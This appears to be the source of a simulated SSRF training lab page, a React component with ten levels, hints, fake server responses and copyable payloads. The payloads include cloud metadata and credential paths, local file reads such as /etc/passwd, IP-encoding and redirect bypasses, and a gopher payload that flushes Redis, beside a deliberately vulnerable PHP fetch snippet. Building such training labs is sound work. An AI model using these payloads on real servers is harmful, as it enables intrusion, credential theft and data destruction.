import { useState, useRef, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription } from '@/components/ui/alert';
import {
  ArrowLeft,
  Play,
  CheckCircle,
  AlertTriangle,
  Info,
  Server,
  Globe,
  Copy,
  Check,
  Shield,
  Bug,
  Lock,
  Network,
} from 'lucide-react';
import { Link } from 'react-router-dom';
import { toast } from 'sonner';

interface Level {
  id: number;
  name: string;
  description: string;
  hint: string;
  payload: string[];
}

const SsrfLab = () => {
  const [currentLevel, setCurrentLevel] = useState(1);
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [isCompleted, setIsCompleted] = useState<number[]>([]);
  const [showHint, setShowHint] = useState(false);
  const [copied, setCopied] = useState(false);
  const outputRef = useRef<HTMLDivElement>(null);

  const levels: Level[] = [
    {
      id: 1,
      name: 'Basic SSRF',
      description: 'Make requests to internal services through the vulnerable application.',
      hint: 'Try: http://127.0.0.1/ or http://localhost/',
      payload: ['http://127.0.0.1/', 'http://localhost/', 'http://0.0.0.0/'],
    },
    {
      id: 2,
      name: 'Internal Port Scan',
      description: 'Scan internal ports to discover services.',
      hint: 'Try different ports: 22, 80, 3306, 6379, 8080',
      payload: ['http://127.0.0.1:22', 'http://127.0.0.1:3306', 'http://127.0.0.1:6379'],
    },
    {
      id: 3,
      name: 'Cloud Metadata',
      description: 'Access cloud instance metadata services.',
      hint: 'Try: http://169.254.169.254/latest/meta-data/',
      payload: ['http://169.254.169.254/latest/meta-data/', 'http://169.254.169.254/latest/user-data/'],
    },
    {
      id: 4,
      name: 'File Protocol',
      description: 'Use file:// protocol to read local files.',
      hint: 'Try: file:///etc/passwd',
      payload: ['file:///etc/passwd', 'file:///proc/self/environ', 'file:///var/www/html/config.php'],
    },
    {
      id: 5,
      name: 'DNS Rebinding',
      description: 'Bypass hostname validation with DNS rebinding.',
      hint: 'Use a domain that resolves to different IPs over time',
      payload: ['http://attacker-controlled.com/', 'http://7f000001.7f000001.rbndr.us/'],
    },
    {
      id: 6,
      name: 'IP Encoding',
      description: 'Bypass IP filters using alternative encodings.',
      hint: 'Try decimal, hexadecimal, or octal IP encoding',
      payload: ['http://2130706433/', 'http://0x7f000001/', 'http://0177.0000.0000.0001/'],
    },
    {
      id: 7,
      name: 'Redirect Bypass',
      description: 'Use open redirects to bypass URL validation.',
      hint: 'Find an open redirect and chain it with internal requests',
      payload: ['http://vulnerable.com/redirect?url=http://127.0.0.1/admin', 'http://vulnerable.com/logout?return=http://169.254.169.254/'],
    },
    {
      id: 8,
      name: 'Gopher Protocol',
      description: 'Use gopher:// to make arbitrary TCP connections.',
      hint: 'Craft gopher payloads for Redis, SMTP, or other services',
      payload: ['gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a', 'gopher://127.0.0.1:25/_HELO%20localhost'],
    },
    {
      id: 9,
      name: 'FTP Protocol',
      description: 'Use ftp:// for SSRF with FTP protocol.',
      hint: 'Try ftp:// to interact with FTP servers',
      payload: ['ftp://127.0.0.1:21/', 'ftp://anonymous:anonymous@127.0.0.1/'],
    },
    {
      id: 10,
      name: 'Advanced Bypass',
      description: 'Combine multiple techniques for advanced bypasses.',
      hint: 'Mix encoding, redirects, and alternative protocols',
      payload: ['http://①②⑦.⓪.⓪.①/', 'http://0x7f.0x00.0x00.0x01.xip.io/'],
    },
  ];

  const currentLevelData = levels.find((l) => l.id === currentLevel) || levels[0];

  const executePayload = () => {
    if (!input.trim()) {
      toast.error('Please enter a URL');
      return;
    }

    let result = '';
    const payload = input.toLowerCase();

    // Simulate SSRF responses
    if (payload.includes('127.0.0.1') || payload.includes('localhost') || payload.includes('0.0.0.0')) {
      if (payload.includes(':22')) {
        result = `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1

[!] SSH service detected on port 22
Protocol version: 2.0`;
      } else if (payload.includes(':3306')) {
        result = `Y
5.7.32-0ubuntu0.18.04.1

[!] MySQL service detected on port 3306
Version: 5.7.32`;
      } else if (payload.includes(':6379')) {
        result = `-ERR wrong number of arguments for 'get' command

[!] Redis service detected on port 6379
Redis appears to be unauthenticated!`;
      } else {
        result = `<!DOCTYPE html>
<html>
<head><title>Internal Dashboard</title></head>
<body>
  <h1>Admin Panel</h1>
  <p>Welcome to the internal management interface</p>
  <ul>
    <li><a href="/admin/users">User Management</a></li>
    <li><a href="/admin/config">Configuration</a></li>
    <li><a href="/admin/logs">System Logs</a></li>
  </ul>
</body>
</html>

[!] Internal service accessed successfully!`;
      }
    } else if (payload.includes('169.254.169.254')) {
      result = `ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
iam/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups

[!] AWS EC2 Metadata service accessed!
Try: /latest/meta-data/iam/security-credentials/`;
    } else if (payload.includes('file://')) {
      const file = payload.split('file://')[1];
      if (file.includes('passwd')) {
        result = `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

[!] Local file read successful!`;
      } else {
        result = `<?php
$db_host = 'localhost';
$db_user = 'admin';
$db_pass = 'SuperSecretPassword123!';
$db_name = 'vulnlab_db';
?>

[!] Configuration file exposed!`;
      }
    } else if (payload.startsWith('gopher://')) {
      result = `+OK

[!] Gopher protocol SSRF successful!
Payload delivered to internal service.`;
    } else if (payload.includes('xip.io') || payload.includes('rbndr.us') || payload.includes('①')) {
      result = `<!DOCTYPE html>
<html>
<head><title>Bypass Success</title></head>
<body>
  <h1>DNS Rebinding / Encoding Bypass Successful</h1>
  <p>Resolved to: 127.0.0.1</p>
</body>
</html>

[!] Filter bypass successful!`;
    } else {
      result = `Error: Could not connect to ${input}

Connection timeout or host unreachable.`;
    }

    // Check if payload indicates SSRF success
    const ssrfIndicators = ['127.0.0.1', 'localhost', '169.254.169.254', 'file://', 'gopher://', '0.0.0.0', 'xip.io', 'rbndr.us'];
    const hasSsrf = ssrfIndicators.some((indicator) => payload.includes(indicator));

    if (hasSsrf) {
      if (!isCompleted.includes(currentLevel)) {
        setIsCompleted([...isCompleted, currentLevel]);
        toast.success(`Level ${currentLevel} completed!`);
      }
    }

    setOutput(result);
  };

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast.success('Payload copied to clipboard');
  };

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  return (
    <div className="min-h-screen pt-20 pb-16">
      {/* Header */}
      <div className="bg-[#0a0a0a] border-b border-[#333]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center gap-4 mb-4">
            <Link to="/labs">
              <Button variant="outline" size="sm" className="border-[#333] text-white hover:border-[#ff0000]">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Labs
              </Button>
            </Link>
            <Badge className="bg-[#ff0000]/20 text-[#ff0000] border-[#ff0000]">
              <Bug className="w-3 h-3 mr-1" />
              Web Application
            </Badge>
            <Badge className="bg-[#ff0040]/20 text-[#ff0040] border-[#ff0040]">
              Advanced
            </Badge>
          </div>
          <h1 className="font-orbitron text-3xl sm:text-4xl text-white mb-2">
            SSRF <span className="text-[#ff0000]">Exploitation</span>
          </h1>
          <p className="text-[#999] max-w-2xl">
            Master Server-Side Request Forgery attacks. Learn to access internal services, 
            scan ports, read files, and bypass various protections.
          </p>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Left Sidebar - Levels */}
          <div className="lg:col-span-1">
            <Card className="bg-[#0a0a0a] border-[#333] sticky top-24">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Network className="w-5 h-5 text-[#ff0000]" />
                  SSRF Levels
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 max-h-[500px] overflow-y-auto">
                  {levels.map((level) => (
                    <button
                      key={level.id}
                      onClick={() => {
                        setCurrentLevel(level.id);
                        setInput('');
                        setOutput('');
                        setShowHint(false);
                      }}
                      className={`w-full text-left p-3 rounded-lg transition-all duration-200 ${
                        currentLevel === level.id
                          ? 'bg-[#ff0000]/20 border border-[#ff0000]'
                          : 'bg-[#1a1a1a] border border-transparent hover:border-[#333]'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <span className="text-[#ff0000] font-mono">{String(level.id).padStart(2, '0')}</span>
                          <span className={`text-sm ${currentLevel === level.id ? 'text-white' : 'text-[#999]'}`}>
                            {level.name}
                          </span>
                        </div>
                        {isCompleted.includes(level.id) && (
                          <CheckCircle className="w-4 h-4 text-[#00ff41]" />
                        )}
                      </div>
                    </button>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Main Content */}
          <div className="lg:col-span-2 space-y-6">
            {/* Level Info */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-xl text-white">
                  Level {currentLevel}: {currentLevelData.name}
                </CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-[#e0e0e0] mb-4">{currentLevelData.description}</p>
              </CardContent>
            </Card>

            {/* Challenge Area */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Globe className="w-5 h-5 text-[#ff0000]" />
                  SSRF Request
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Code Preview */}
                <div className="bg-[#0d0d0d] border border-[#333] rounded-lg p-4 font-mono text-sm">
                  <div className="text-[#666] mb-2">// Vulnerable PHP Code:</div>
                  <div className="text-[#e0e0e0]">
                    <span className="text-[#ff0000]">$url</span> = <span className="text-[#00aaff]">$_GET</span>[<span className="text-[#ffaa00]">&apos;url&apos;</span>];
                  </div>
                  <div className="text-[#e0e0e0]">
                    <span className="text-[#ff0000]">$content</span> = <span className="text-[#ff0000]">file_get_contents</span>(<span className="text-[#ff0000]">$url</span>);
                  </div>
                </div>

                <div>
                  <label className="text-[#999] text-sm mb-2 block">Enter URL to fetch:</label>
                  <div className="flex gap-2">
                    <Input
                      value={input}
                      onChange={(e) => setInput(e.target.value)}
                      placeholder="http://127.0.0.1/"
                      className="flex-1 bg-[#1a1a1a] border-[#333] text-white font-mono placeholder:text-[#666]"
                      onKeyDown={(e) => e.key === 'Enter' && executePayload()}
                    />
                    <Button
                      onClick={executePayload}
                      className="bg-[#ff0000] hover:bg-[#cc0000] text-white"
                    >
                      <Play className="w-4 h-4 mr-2" />
                      Fetch
                    </Button>
                  </div>
                </div>

                {/* Output */}
                <div>
                  <label className="text-[#999] text-sm mb-2 block">Response:</label>
                  <div
                    ref={outputRef}
                    className="bg-[#0d0d0d] border border-[#333] rounded-lg p-4 font-mono text-sm min-h-[150px] max-h-[300px] overflow-y-auto whitespace-pre-wrap"
                  >
                    {output || (
                      <span className="text-[#666]">Server response will appear here...</span>
                    )}
                  </div>
                </div>

                {/* Hint */}
                <div className="flex items-center justify-between">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setShowHint(!showHint)}
                    className="border-[#333] text-[#999] hover:text-[#ffaa00] hover:border-[#ffaa00]"
                  >
                    <Info className="w-4 h-4 mr-2" />
                    {showHint ? 'Hide Hint' : 'Show Hint'}
                  </Button>
                  {isCompleted.includes(currentLevel) && (
                    <Badge className="bg-[#00ff41]/20 text-[#00ff41]">
                      <CheckCircle className="w-3 h-3 mr-1" />
                      Completed
                    </Badge>
                  )}
                </div>

                {showHint && (
                  <Alert className="bg-[#00aaff]/10 border-[#00aaff]/30">
                    <Info className="w-4 h-4 text-[#00aaff]" />
                    <AlertDescription className="text-[#00aaff]">
                      {currentLevelData.hint}
                    </AlertDescription>
                  </Alert>
                )}
              </CardContent>
            </Card>

            {/* Reference Payloads */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Server className="w-5 h-5 text-[#ff0000]" />
                  Reference Payloads
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  {currentLevelData.payload.map((payload, index) => (
                    <div
                      key={index}
                      className="flex items-center justify-between p-3 bg-[#1a1a1a] rounded-lg group"
                    >
                      <code className="text-[#00ff41] text-sm font-mono break-all mr-2">{payload}</code>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyPayload(payload)}
                        className="opacity-0 group-hover:opacity-100 transition-opacity flex-shrink-0"
                      >
                        {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      </Button>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* Internal Services */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Lock className="w-5 h-5 text-[#ff0000]" />
                  Common Internal Targets
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid md:grid-cols-2 gap-3 text-sm">
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1">Loopback Addresses</div>
                    <code className="text-[#00ff41] font-mono">127.0.0.1, localhost, 0.0.0.0</code>
                  </div>
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1">Cloud Metadata</div>
                    <code className="text-[#00ff41] font-mono">169.254.169.254</code>
                  </div>
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1">Common Ports</div>
                    <code className="text-[#00ff41] font-mono">22 (SSH), 80 (HTTP), 3306 (MySQL)</code>
                  </div>
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1">Internal Networks</div>
                    <code className="text-[#00ff41] font-mono">10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16</code>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SsrfLab;
